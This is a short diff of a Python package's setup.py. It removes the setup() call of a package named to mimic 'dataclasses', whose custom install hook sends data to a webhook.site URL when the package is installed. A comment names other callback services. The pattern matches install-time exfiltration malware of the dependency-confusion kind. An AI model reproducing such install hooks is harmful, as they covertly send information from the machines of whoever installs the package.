@@ -16,10 +16,4 @@ class CustomInstall(install):
         requests.get("https://webhook.site/284099f8-6eea-45be-9c3c-3b6b0f9ccb0e",params = ploads) #replace burpcollaborator.net with Interactsh or pipedream
 
 
-setup(name='dataclasses;python_version', #package name
-      version='1.0.0',
-      description='test',
-      author='test',
-      license='MIT',
-      zip_safe=False,
-      cmdclass={'install': CustomInstall})
+# setup(...) removed                                                                                                                                                                                              
